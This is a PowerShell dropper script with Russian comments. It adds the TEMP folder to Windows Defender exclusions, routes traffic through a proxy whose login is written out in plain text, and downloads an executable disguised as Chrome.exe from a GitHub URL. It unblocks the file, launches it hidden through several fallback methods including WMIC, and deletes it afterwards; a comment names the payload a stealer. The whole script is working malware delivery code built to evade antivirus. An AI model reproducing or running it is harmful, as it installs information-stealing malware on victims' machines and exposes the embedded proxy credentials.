# ============================================================
# Простой загрузчик клиента через прокси (с обходом Defender)
# ============================================================

# 1. Добавляем исключение для TEMP в Defender
try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
} catch {}

# 2. Настройка глобального прокси
$env:HTTP_PROXY = "http://user-xpx93ax5:5pxp942ldb7jtnh2@gate.proxydata.ru:3129"
$env:HTTPS_PROXY = "http://user-xpx93ax5:5pxp942ldb7jtnh2@gate.proxydata.ru:3129"
[System.Net.WebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
[System.Net.WebRequest]::DefaultWebProxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")

# 3. Скачиваем клиент
$clientUrl = "https://raw.githubusercontent.com/eblan0421-lab/legendarypupsik/refs/heads/main/Chrome.exe"
$outPath = "$env:TEMP\client.exe"

# Скачиваем
try {
    (New-Object System.Net.WebClient).DownloadFile($clientUrl, $outPath)
} catch {
    Invoke-WebRequest -Uri $clientUrl -OutFile $outPath
}

# 4. Если файл скачался – пытаемся запустить
if (Test-Path $outPath) {
    # Разблокируем файл (если помечен как "из интернета")
    Unblock-File -Path $outPath -ErrorAction SilentlyContinue

    # Способ 1: через Start-Process
    try {
        Start-Process -FilePath $outPath -WindowStyle Hidden
        Write-Host "✅ Запущено через Start-Process"
    } catch {
        # Способ 2: через cmd /c start (иногда обходит блокировки)
        try {
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c start """" `"$outPath`"" -WindowStyle Hidden
            Write-Host "✅ Запущено через cmd /c start"
        } catch {
            # Способ 3: через WMIC (запуск от имени системы, но требует прав)
            try {
                wmic process call create `"$outPath`" | Out-Null
                Write-Host "✅ Запущено через WMIC"
            } catch {
                Write-Host "❌ Все способы запуска не удались"
            }
        }
    }

    # Ждём 10 секунд и удаляем файл (если стилер не зависит от файла)
    Start-Sleep -Seconds 10
    Remove-Item $outPath -Force -ErrorAction SilentlyContinue
} else {
    # Если не скачалось – пробуем через curl
    $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
    $proxyUrl = "http://gate.proxydata.ru:3129"
    curl.exe -x $proxyUrl -U $proxyAuth -L $clientUrl -o $outPath
    if (Test-Path $outPath) {
        Unblock-File -Path $outPath -ErrorAction SilentlyContinue
        Start-Process -FilePath $outPath -WindowStyle Hidden
    }
}
